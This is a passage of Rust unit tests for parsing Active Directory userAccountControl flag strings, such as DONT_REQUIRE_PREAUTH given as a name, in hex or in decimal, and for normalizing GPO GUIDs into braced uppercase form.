            0x0040_0000 | 0x0008_0000
        );
        // Hex + decimal
        assert_eq!(parse_uac_flags("0x400000, 512").unwrap(), 0x40_0000 | 512);
        // Empty → error (don't silently write UAC=0)
        assert!(parse_uac_flags("").is_err());
        // Case-insensitive
        assert_eq!(
            parse_uac_flags("dont_require_preauth").unwrap(),
            0x0040_0000
        );
        // Unknown flag rejected
        assert!(parse_uac_flags("FROBNICATE").is_err());
    }

    #[test]
    fn normalize_gpo_guid_accepts_braced_and_unbraced() {
        assert_eq!(normalize_gpo_guid("abc-def"), "{ABC-DEF}");
        assert_eq!(normalize_gpo_guid("{abc-def}"), "{ABC-DEF}");
        assert_eq!(normalize_gpo_guid("  {ABC-DEF}  "), "{ABC-DEF}");
    }
}
